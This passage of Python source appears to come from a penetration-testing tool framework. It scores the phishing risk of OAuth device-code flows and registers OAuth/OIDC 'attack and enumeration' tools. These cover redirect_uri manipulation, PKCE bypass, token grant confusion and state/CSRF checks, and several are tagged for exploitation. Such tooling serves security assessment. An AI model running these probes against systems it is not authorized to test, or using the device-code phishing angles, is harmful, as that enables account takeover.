        lines.append("           Skipped - no device_code received from initiation step")
        results.append({
            "test": "polling_interval_bypass",
            "skipped": True,
            "vulnerable": False,
            "description": "Could not test - device code not issued",
        })

    # -- Test 4: Device code phishing vector assessment --
    lines.append("  Test 4 - Device code phishing vector assessment")
    phishing_notes: list[str] = []
    phishing_risk = "low"

    if verification_uri:
        # Short, memorable verification URIs are more phishable
        if len(verification_uri) <= 30:
            phishing_notes.append(f"Short verification URI ({verification_uri}) - easy to impersonate")
            phishing_risk = "medium"
        if not verification_uri.startswith("https://"):
            phishing_notes.append(f"Non-HTTPS verification URI - trivially interceptable")
            phishing_risk = "high"

    if user_code and len(user_code.replace("-", "")) <= 8:
        phishing_notes.append(f"Short user code ({user_code!r}) easy to include in phishing messages")
        if phishing_risk == "low":
            phishing_risk = "medium"

    if expires_in and int(expires_in) >= 900:
        phishing_notes.append(f"Long expiry ({expires_in}s) gives attacker ample time for social engineering")

    if doc_init.get("verification_uri_complete"):
        phishing_notes.append("verification_uri_complete present - single click activation, ideal for phishing")
        phishing_risk = "high"

    lines.append(f"           phishing_risk={phishing_risk}")
    for note in phishing_notes:
        lines.append(f"           {note}")

    results.append({
        "test": "phishing_vector",
        "verification_uri": verification_uri,
        "user_code": user_code,
        "expires_in": expires_in,
        "phishing_risk": phishing_risk,
        "notes": phishing_notes,
        "vulnerable": phishing_risk in ("medium", "high"),
        "description": "Device code flows are inherently vulnerable to social engineering - assess severity",
    })

    vulnerable_count = sum(1 for r in results if r.get("vulnerable"))
    lines.append(f"\n  Summary: {vulnerable_count}/{len(results)} device code tests indicate vulnerabilities")

    return {
        "stdout": "\n".join(lines),
        "stderr": "",
        "returncode": 0,
        "parsed": {
            "device_endpoint": device_endpoint,
            "device_supported": device_supported,
            "device_code": device_code,
            "user_code": user_code,
            "verification_uri": verification_uri,
            "results": results,
            "vulnerable_count": vulnerable_count,
        },
    }


# ---------------------------------------------------------------------------
# Tool registration
# ---------------------------------------------------------------------------


def register_oauth_tools(config: Config) -> list[Tool]:
    """Register OAuth/OIDC attack and enumeration tools."""
    tools: list[Tool] = []

    if "curl" not in config.tool_paths:
        return tools

    tools.append(Tool(
        name="oauth_detect",
        description=(
            "Detect OAuth/OIDC endpoints on a target. Probes /.well-known/openid-configuration, "
            "/.well-known/oauth-authorization-server, and common OAuth paths. Extracts auth/token "
            "endpoints, supported response types, client_id hints, and identifies the provider "
            "(Okta, Auth0, Cognito, Azure AD, Google, or custom)."
        ),
        parameters={
            "target": "Target base URL or domain (e.g. https://example.com)",
        },
        example='{"target": "https://example.com"}',
        phase_tags=["discovery", "recon"],
        execute=oauth_detect,
    ))

    tools.append(Tool(
        name="oauth_redirect_test",
        description=(
            "Test redirect_uri manipulation on an OAuth authorization endpoint. Tests path traversal, "
            "subdomain bypass, parameter injection, fragment injection, URL encoding bypass (@-sign), "
            "double encoding, null byte, localhost substitution, scheme mismatch, port injection, "
            "case variation, and leading dot attacks."
        ),
        parameters={
            "target": "Target base URL or the authorization endpoint directly",
            "client_id": "client_id to include in requests (optional)",
            "redirect_uri": "Registered redirect URI to use as the base for manipulations (optional)",
        },
        example='{"target": "https://example.com", "client_id": "abc123", "redirect_uri": "https://example.com/callback"}',
        phase_tags=["vulnerability_scan", "exploitation"],
        execute=oauth_redirect_test,
    ))

    tools.append(Tool(
        name="oauth_pkce_test",
        description=(
            "Test PKCE (Proof Key for Code Exchange) enforcement. Checks whether the server rejects "
            "requests with no code_challenge, accepts the weaker 'plain' method instead of S256, "
            "detects mismatched code_verifier at token exchange, and tests the CVE-2024-23647 pattern "
            "of omitting code_challenge to revert to a non-PKCE injectable flow."
        ),
        parameters={
            "target": "Target base URL",
            "auth_endpoint": "Authorization endpoint URL (optional, auto-detected from target)",
            "token_endpoint": "Token endpoint URL (optional, auto-detected from target)",
        },
        example='{"target": "https://example.com", "auth_endpoint": "https://example.com/oauth/authorize", "token_endpoint": "https://example.com/oauth/token"}',
        phase_tags=["vulnerability_scan", "exploitation"],
        execute=oauth_pkce_test,
    ))

    tools.append(Tool(
        name="oauth_token_test",
        description=(
            "Test OAuth token endpoint for grant type confusion (switching to client_credentials), "
            "RFC 8693 token exchange manipulation, refresh token scope escalation, "
            "client authentication bypass (omit client_secret), and implicit grant availability."
        ),
        parameters={
            "target": "Target base URL",
            "token_endpoint": "Token endpoint URL (optional, auto-detected as /oauth/token)",
        },
        example='{"target": "https://example.com", "token_endpoint": "https://example.com/oauth/token"}',
        phase_tags=["vulnerability_scan", "exploitation"],
        execute=oauth_token_test,
    ))

    tools.append(Tool(
        name="oauth_state_test",
        description=(
            "Test OAuth state parameter handling for CSRF vulnerabilities. Checks whether state is "
            "required, whether predictable values (1, null, 'state') are accepted, whether the state "
            "is fixed/echoed back in the redirect, and whether an empty state value passes validation."
        ),
        parameters={
            "target": "Target base URL",
            "auth_endpoint": "Authorization endpoint URL (optional, auto-detected from target)",
        },
        example='{"target": "https://example.com", "auth_endpoint": "https://example.com/oauth/authorize"}',
        phase_tags=["vulnerability_scan"],
        execute=oauth_state_test,
    ))

    tools.append(Tool(
        name="oauth_device_code",
        description=(
            "Test OAuth device authorization flow (RFC 8628) for phishing vector identification, "
            "polling interval bypass (missing slow_down enforcement), user code brute force feasibility "
            "(short/low-entropy codes), and device code phishing risk assessment via verification_uri "
            "length, expiry duration, and verification_uri_complete presence."
        ),
        parameters={
            "target": "Target base URL",
            "device_endpoint": "Device authorization endpoint URL (optional, auto-detected)",
        },
        example='{"target": "https://example.com", "device_endpoint": "https://example.com/oauth/device/code"}',
        phase_tags=["discovery", "vulnerability_scan"],
        execute=oauth_device_code,
    ))

    return tools
